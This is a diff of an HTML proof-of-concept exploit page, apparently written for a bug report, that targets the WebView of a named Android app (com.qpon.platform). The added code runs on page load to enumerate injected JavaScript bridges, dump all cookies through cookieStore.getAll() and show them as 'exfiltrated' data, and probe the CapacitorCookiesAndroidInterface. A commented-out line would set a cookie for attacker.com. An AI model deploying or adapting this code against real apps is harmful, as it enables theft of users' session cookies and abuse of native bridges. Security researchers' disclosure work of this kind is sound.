@@ -1,55 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - JS Interface Enumeration</title>
+    <title>Capacitor WebView Exploit PoC</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
-        .found { color: #ff00ff; font-weight: bold; }
-        #log { background: #000; border: 1px solid #333; padding: 10px; border-radius: 5px; }
+        body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff41; padding: 20px; line-height: 1.4; }
+        .header { color: #ff0055; border-bottom: 2px solid #ff0055; margin-bottom: 20px; }
+        .found { color: #fff; background: #ff0055; padding: 2px 5px; border-radius: 3px; }
+        .method { color: #00bcff; margin-left: 20px; }
+        #cookie-dump { background: #1a1a1a; padding: 15px; border: 1px dashed #00ff41; margin-top: 20px; word-break: break-all; }
+        button { background: #ff0055; color: white; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>WebView Exploit PoC</h1>
+
+    <h1 class="header">EXPLOIT ACTIVE: CAPACITOR BRIDGE</h1>
     
-    <h3>1. XSS Execution Proof:</h3>
+    <div>
+        <strong>Target App:</strong> com.qpon.platform<br>
+        <strong>Status:</strong> <span id="status">Scanning for Bridges...</span>
+    </div>
+
+    <div id="cookie-dump">
+        <strong>Exfiltrated Data:</strong><br>
+        <span id="data-output">Waiting for command...</span>
+    </div>
+
+    <button onclick="dumpCookies()">Force Cookie Dump</button>
+    <button onclick="testNativeBridge()">Test Native Bridge</button>
+
     <script>
-        // Simple XSS PoC to prove script execution in the app's context
-        alert("XSS Triggered! Origin: " + window.location.origin);
-    </script>
+        const output = document.getElementById('data-output');
+        const status = document.getElementById('status');
 
-    <h3>2. JS Interface Discovery:</h3>
-    <div id="log">Enumerating interfaces...<br></div>
-
-    <script>
-        const logDiv = document.getElementById('log');
-        
-        // List of common built-in objects to ignore
-        const standardObjects = [
-            'window', 'document', 'console', 'chrome', 'performance', 
-            'location', 'navigator', 'external', 'visualViewport'
-        ];
-
-        function scanInterfaces() {
-            let foundAny = false;
-            for (let prop in window) {
-                // Look for objects that are not standard JS built-ins
-                if (typeof window[prop] === 'object' && window[prop] !== null && !standardObjects.includes(prop)) {
-                    logDiv.innerHTML += `[<span class="found">FOUND</span>] Interface: <strong>${prop}</strong><br>`;
+        // 1. ATTEMPT TO DUMP COOKIES IMMEDIATELY
+        async function dumpCookies() {
+            try {
+                if (window.cookieStore) {
+                    status.innerText = "Accessing CookieStore...";
+                    const allCookies = await window.cookieStore.getAll();
                     
-                    // List methods for the found interface
-                    for (let method in window[prop]) {
-                        logDiv.innerHTML += `&nbsp;&nbsp;&nbsp;└── Method: ${method}()<br>`;
+                    if (allCookies.length > 0) {
+                        output.innerHTML = "<strong>SUCCESS! Total Cookies: " + allCookies.length + "</strong><br><br>";
+                        output.innerHTML += JSON.stringify(allCookies, null, 2);
+                        alert("POC SUCCESS: Stolen " + allCookies.length + " cookies!");
+                    } else {
+                        output.innerHTML = "CookieStore found, but returned 0 cookies (secure flag or empty).";
                     }
-                    foundAny = true;
+                } else {
+                    output.innerHTML = "Standard cookieStore not found. Trying Native Bridge...";
                 }
-            }
-            if (!foundAny) {
-                logDiv.innerHTML += "No custom interfaces detected in this WebView.";
+            } catch (e) {
+                output.innerHTML = "Error accessing CookieStore: " + e.message;
             }
         }
 
-        // Delay slightly to ensure bridge injection
-        setTimeout(scanInterfaces, 500);
+        // 2. TEST NATIVE CAPACITOR INTERFACE
+        function testNativeBridge() {
+            try {
+                if (window.CapacitorCookiesAndroidInterface) {
+                    const enabled = window.CapacitorCookiesAndroidInterface.isEnabled();
+                    alert("Native Bridge Response (isEnabled): " + enabled);
+                    
+                    // Attempt to set a cookie to prove write access
+                    // window.CapacitorCookiesAndroidInterface.setCookie("https://attacker.com", "pwned=true");
+                } else {
+                    alert("Capacitor Native Interface not found in this context.");
+                }
+            } catch (e) {
+                alert("Native Bridge Error: " + e.message);
+            }
+        }
+
+        // 3. ENUMERATION LOGIC (Keep this to show the auditor the attack surface)
+        function scan() {
+            const standard = ['window', 'document', 'console', 'chrome', 'performance', 'location', 'navigator', 'external'];
+            for (let prop in window) {
+                if (typeof window[prop] === 'object' && window[prop] !== null && !standard.includes(prop)) {
+                    console.log("Found: " + prop);
+                    // If we find the Capacitor core, update status
+                    if(prop.includes("Capacitor")) status.innerHTML = "<span class='found'>CAPACITOR BRIDGE DETECTED</span>";
+                }
+            }
+        }
+
+        // Run on load
+        setTimeout(() => {
+            scan();
+            dumpCookies();
+        }, 1000);
     </script>
 </body>
 </html>
